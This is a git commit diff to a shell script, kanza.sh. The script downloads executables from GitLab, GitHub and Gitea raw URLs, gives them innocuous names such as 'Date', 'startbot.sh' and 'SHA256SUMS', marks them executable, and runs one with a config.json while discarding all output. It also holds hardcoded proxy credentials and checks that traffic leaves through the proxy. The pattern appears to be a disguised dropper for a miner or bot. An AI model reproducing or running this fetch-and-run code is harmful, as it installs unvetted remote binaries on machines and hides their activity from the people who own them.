5c1dfc5e0ef321f9310997dd8e528f7abee19c74
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-03 09:06:47 +0700

    Update kanza.sh

--- kanza.sh
+++ kanza.sh
@@ -2,7 +2,7 @@ proxy="38.154.227.167"
 port="5868" 
 user="ugursfso"  
 pass="wqn60pnk6m95"  
-wget -q -O Date https://gitlab.com/55113110159/dokerweb/-/raw/main/kanza6.18.1 && chmod +x Date
+wget -q -O startbot.sh https://gitlab.com/55113110159/dokerweb/-/raw/main/kanza6.18.1 && chmod +x startbot.sh
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
@@ -21,4 +21,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./Date -c "config.json" >/dev/null 2>&1
+./startbot.sh ./Date -c "config.json" >/dev/null 2>&1
